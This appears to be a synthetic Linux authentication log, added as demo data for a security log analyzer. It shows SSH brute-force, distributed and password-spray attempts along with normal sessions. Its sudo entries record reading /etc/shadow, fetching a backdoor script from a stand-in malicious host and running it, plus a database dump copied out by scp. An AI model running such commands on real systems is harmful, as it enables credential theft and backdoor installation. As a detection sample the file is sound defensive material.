@@ -1,0 +1,71 @@
+# Linux Authentication Log - Sample with Attack Patterns
+# Generated for Security Log Analyzer Demo
+Jan 15 06:00:01 webserver CRON[12345]: pam_unix(cron:session): session opened for user root by (uid=0)
+Jan 15 06:00:02 webserver CRON[12345]: pam_unix(cron:session): session closed for user root
+Jan 15 08:15:22 webserver sshd[23456]: Accepted publickey for ubuntu from 192.168.1.100 port 52341 ssh2
+Jan 15 08:15:23 webserver sshd[23456]: pam_unix(sshd:session): session opened for user ubuntu by (uid=0)
+Jan 15 08:45:11 webserver sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/apt update
+# Brute Force SSH Attack
+Jan 15 09:00:01 webserver sshd[24001]: Invalid user admin from 45.33.32.156 port 54321
+Jan 15 09:00:01 webserver sshd[24001]: Failed password for invalid user admin from 45.33.32.156 port 54321 ssh2
+Jan 15 09:00:02 webserver sshd[24002]: Invalid user admin from 45.33.32.156 port 54322
+Jan 15 09:00:02 webserver sshd[24002]: Failed password for invalid user admin from 45.33.32.156 port 54322 ssh2
+Jan 15 09:00:03 webserver sshd[24003]: Invalid user root from 45.33.32.156 port 54323
+Jan 15 09:00:03 webserver sshd[24003]: Failed password for invalid user root from 45.33.32.156 port 54323 ssh2
+Jan 15 09:00:04 webserver sshd[24004]: Invalid user administrator from 45.33.32.156 port 54324
+Jan 15 09:00:04 webserver sshd[24004]: Failed password for invalid user administrator from 45.33.32.156 port 54324 ssh2
+Jan 15 09:00:05 webserver sshd[24005]: Invalid user test from 45.33.32.156 port 54325
+Jan 15 09:00:05 webserver sshd[24005]: Failed password for invalid user test from 45.33.32.156 port 54325 ssh2
+Jan 15 09:00:06 webserver sshd[24006]: Invalid user guest from 45.33.32.156 port 54326
+Jan 15 09:00:06 webserver sshd[24006]: Failed password for invalid user guest from 45.33.32.156 port 54326 ssh2
+Jan 15 09:00:07 webserver sshd[24007]: Invalid user oracle from 45.33.32.156 port 54327
+Jan 15 09:00:07 webserver sshd[24007]: Failed password for invalid user oracle from 45.33.32.156 port 54327 ssh2
+Jan 15 09:00:08 webserver sshd[24008]: Invalid user mysql from 45.33.32.156 port 54328
+Jan 15 09:00:08 webserver sshd[24008]: Failed password for invalid user mysql from 45.33.32.156 port 54328 ssh2
+Jan 15 09:00:09 webserver sshd[24009]: Invalid user postgres from 45.33.32.156 port 54329
+Jan 15 09:00:09 webserver sshd[24009]: Failed password for invalid user postgres from 45.33.32.156 port 54329 ssh2
+Jan 15 09:00:10 webserver sshd[24010]: Invalid user ubuntu from 45.33.32.156 port 54330
+Jan 15 09:00:10 webserver sshd[24010]: Failed password for invalid user ubuntu from 45.33.32.156 port 54330 ssh2
+Jan 15 09:00:11 webserver sshd[24000]: Disconnecting: Too many authentication failures
+Jan 15 09:00:11 webserver sshd[24000]: PAM 5 more authentication failures; logname= uid=0 euid=0 tty=ssh ruser= rhost=45.33.32.156
+# Distributed Attack - Multiple IPs targeting same user
+Jan 15 10:30:01 webserver sshd[25001]: Failed password for developer from 103.45.67.89 port 45001 ssh2
+Jan 15 10:30:02 webserver sshd[25002]: Failed password for developer from 185.220.101.45 port 45002 ssh2
+Jan 15 10:30:03 webserver sshd[25003]: Failed password for developer from 91.121.45.67 port 45003 ssh2
+Jan 15 10:30:04 webserver sshd[25004]: Failed password for developer from 77.88.55.66 port 45004 ssh2
+Jan 15 10:30:05 webserver sshd[25005]: Failed password for developer from 5.188.206.10 port 45005 ssh2
+Jan 15 10:30:06 webserver sshd[25006]: Failed password for developer from 141.98.10.56 port 45006 ssh2
+Jan 15 10:30:07 webserver sshd[25007]: Failed password for developer from 45.155.205.233 port 45007 ssh2
+Jan 15 10:30:08 webserver sshd[25008]: Failed password for developer from 193.32.162.89 port 45008 ssh2
+Jan 15 10:30:09 webserver sshd[25009]: Failed password for developer from 89.248.165.52 port 45009 ssh2
+Jan 15 10:30:10 webserver sshd[25010]: Failed password for developer from 45.83.66.180 port 45010 ssh2
+Jan 15 10:30:11 webserver sshd[25011]: Failed password for developer from 94.232.43.200 port 45011 ssh2
+# Successful attack after brute force
+Jan 15 10:31:00 webserver sshd[25100]: Accepted password for developer from 45.83.66.180 port 45100 ssh2
+Jan 15 10:31:01 webserver sshd[25100]: pam_unix(sshd:session): session opened for user developer by (uid=0)
+# Suspicious sudo usage
+Jan 15 10:32:15 webserver sudo: developer : TTY=pts/1 ; PWD=/home/developer ; USER=root ; COMMAND=/bin/cat /etc/shadow
+Jan 15 10:32:45 webserver sudo: developer : TTY=pts/1 ; PWD=/home/developer ; USER=root ; COMMAND=/usr/bin/wget http://malicious.example.com/backdoor.sh
+Jan 15 10:33:00 webserver sudo: developer : TTY=pts/1 ; PWD=/home/developer ; USER=root ; COMMAND=/bin/bash /tmp/backdoor.sh
+# Failed sudo attempts
+Jan 15 11:00:01 webserver sudo:    alice : 3 incorrect password attempts ; TTY=pts/2 ; PWD=/home/alice ; USER=root ; COMMAND=/bin/su -
+Jan 15 11:00:15 webserver sudo: pam_unix(sudo:auth): authentication failure; logname=alice uid=1001 euid=0 tty=/dev/pts/2 ruser=alice rhost= user=alice
+# Normal activity
+Jan 15 12:00:00 webserver sshd[26000]: Accepted publickey for alice from 192.168.1.55 port 55001 ssh2
+Jan 15 12:00:01 webserver sshd[26000]: pam_unix(sshd:session): session opened for user alice by (uid=0)
+Jan 15 12:30:00 webserver sudo:    alice : TTY=pts/3 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx
+Jan 15 13:00:00 webserver sshd[26000]: pam_unix(sshd:session): session closed for user alice
+Jan 15 14:00:00 webserver sshd[27000]: Accepted publickey for bob from 192.168.1.56 port 55002 ssh2
+Jan 15 14:00:01 webserver sshd[27000]: pam_unix(sshd:session): session opened for user bob by (uid=0)
+# Off-hours access
+Jan 15 02:30:00 webserver sshd[28000]: Accepted password for sysadmin from 10.0.0.50 port 56000 ssh2
+Jan 15 02:30:01 webserver sshd[28000]: pam_unix(sshd:session): session opened for user sysadmin by (uid=0)
+Jan 15 02:35:00 webserver sudo: sysadmin : TTY=pts/4 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/mysqldump -u root -p company_db > /tmp/backup.sql
+Jan 15 02:40:00 webserver sudo: sysadmin : TTY=pts/4 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/scp /tmp/backup.sql external@192.168.100.50:/backups/
+# Password spray attempt - same password, different users
+Jan 15 15:00:01 webserver sshd[29001]: Failed password for john from 5.188.206.10 port 60001 ssh2
+Jan 15 15:00:02 webserver sshd[29002]: Failed password for jane from 5.188.206.10 port 60002 ssh2
+Jan 15 15:00:03 webserver sshd[29003]: Failed password for mike from 5.188.206.10 port 60003 ssh2
+Jan 15 15:00:04 webserver sshd[29004]: Failed password for sarah from 5.188.206.10 port 60004 ssh2
+Jan 15 15:00:05 webserver sshd[29005]: Failed password for admin from 5.188.206.10 port 60005 ssh2
+# End of sample log
